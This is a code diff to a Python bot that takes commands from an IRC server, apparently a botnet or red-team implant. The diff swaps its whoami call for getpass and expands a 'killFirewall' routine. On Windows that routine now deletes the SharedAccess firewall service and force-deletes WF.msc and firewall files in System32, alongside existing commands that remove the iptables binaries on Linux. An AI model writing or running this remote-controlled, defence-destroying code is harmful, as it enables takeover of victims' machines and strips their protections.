@@ -23,6 +23,7 @@ import os
 import subprocess as sub
 from sys import argv
 from random import randint
+import getpass
 
 def generateNick(operatingSystem): #generates a nick for the server
 	if operatingSystem == "":
@@ -102,8 +103,7 @@ def reply(): #send back to IRC server that you are here
 	sendData("Yes I am here")
 
 def whoAmI(): #execute whoami command and send output
-	output  = execute("whoami")
-	sendData(output)
+	sendData(getpass.getuser())
 
 def iAmGood(): #send back to IRC server that you are good
 	sendData("I am good. And you?")
@@ -153,7 +153,9 @@ def killFirewall(): #removes the firewall from the box
 		execute("rm -f $(which iptables)")
 		execute("rm -f $(which ip6tables)")
 	elif operatingSystem == "windows":
-		execute("del /F 'C:\\Windows\\System32\\WF.msc'")
+		execute("sc delete SharedAccess")
+		execute("del /F C:\\Windows\\System32\\WF.msc")
+		execute("del /F C:\\Windows\\System32\\firewall*")
 
 def flushFirewall(): #flushes the firewall rules
 	if (operatingSystem == "linux"):
